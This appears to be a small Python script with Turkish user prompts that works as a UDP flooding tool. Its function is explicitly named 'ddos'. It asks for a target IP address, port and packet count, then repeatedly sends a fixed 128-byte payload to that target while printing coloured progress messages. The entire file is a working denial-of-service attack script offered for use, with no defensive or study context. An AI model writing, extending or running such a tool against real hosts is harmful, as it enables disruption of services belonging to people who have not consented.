import socket
import random
import time
from termcolor import colored

def ddos(ip, port, message):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message, (ip, port))
    sock.close()

if __name__ == "__main__":
    ip = input("Hedef IP adresi: ")
    port = int(input("Hedef port numarası: "))
    count = int(input("Kaç paket gönderilsin: "))

    message = b'\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\x0c\r\x0e\x0f' * 8  # Gönderilecek mesaj, daha büyük ve daha karmaşık

    for i in range(count):
        try:
            print(colored(f"Paket gönderiliyor: {i+1}/{count}", 'green'))
            ddos(ip, port, message)
            time.sleep(0.1)
        except socket.gaierror:
            print(colored("Hedef IP adresi geçersiz. Lütfen geçerli bir IP adresi girin.", 'red'))
            break
